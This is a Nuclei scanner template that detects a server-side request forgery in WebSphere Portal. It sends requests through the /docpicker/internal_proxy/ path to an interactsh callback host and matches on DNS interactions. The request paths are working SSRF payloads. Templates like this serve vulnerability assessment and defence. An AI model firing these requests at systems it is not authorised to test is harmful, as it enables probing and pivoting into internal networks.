# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
id: WebSphere-SSRF

info:
  name: Websphere SSRF
  author: Excis3
  severity: high
  description: websphere SSRF https://blog.assetnote.io/2021/12/25/advisory-websphere-portal/
  tags: SSRF

http:
  - method: GET
    path:
      - "{{BaseURL}}/docpicker/internal_proxy/https/{{interactsh-url}}"
      - "{{BaseURL}}/docpicker/internal_proxy/http/{{interactsh-url}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
